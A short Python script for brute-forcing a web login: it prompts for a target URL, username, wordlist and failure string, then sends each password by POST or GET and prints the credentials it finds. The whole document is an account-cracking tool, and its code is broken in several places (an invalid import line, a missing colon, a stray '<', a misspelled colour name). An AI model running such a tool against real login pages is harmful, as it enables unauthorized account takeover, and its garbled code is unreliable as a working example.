import requests
import termcolor import colored

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For the Account to Bruteforce: ')
password_file = input('[+] Enter Password File to Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value(Optional): ')


def cracking(username, url)
    for password in passwords:
        password = password.strip()
        print(colored(('Trying: ' + password), 'red'))
        data = {'username':username,'password':password,'Login':'submit'} #fields require modification per target
        if cookie_value != '': 
            response = requests.get(url, params = {'username':username,'password':password,'Login':'Login'}, < cookies = {'Cookie': cookie_value}) #fields & request.get require modification per target
        else:
            response = requests.post(url, data=data) #request.post requires modification per target
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(('[+] Found Username: ==> ' + username), 'green'))
            print(colored(('[+] Found Password: ==> ' + password), 'greem'))
            exit()


with open(password_file, 'r') as passwords:
    cracking(username, url)


print('[!!] Password Not in List')
